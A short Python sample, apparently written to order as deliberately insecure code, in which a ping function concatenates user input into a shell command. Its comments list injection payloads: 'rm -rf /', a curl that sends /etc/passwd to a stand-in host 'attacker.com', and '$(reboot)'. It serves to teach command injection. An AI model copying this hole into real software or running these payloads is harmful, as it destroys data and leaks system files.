# Write insecure code to ping a user-specified host that unsafely concatenates the user input directly into the system ping command

import os

def ping_host(user_input: str) -> str:
    """
    VULNERABLE: DO NOT USE.
    Concatenates unsanitized user input directly into a shell command.
    An attacker can inject shell metacharacters to run arbitrary commands.
    """
    command = "ping -c 4 " + user_input
    return os.popen(command).read()

# Example of normal use:
#   ping_host("8.8.8.8")
#
# Example of exploitation:
#   ping_host("8.8.8.8; rm -rf /")
#   ping_host("8.8.8.8 && curl attacker.com/steal?data=$(cat /etc/passwd)")
#   ping_host("$(reboot)")
#
# Because os.popen() invokes a shell, any of ; | & $() ` characters in
# user_input let an attacker chain or substitute their own commands,
# running with whatever privileges the Python process has.

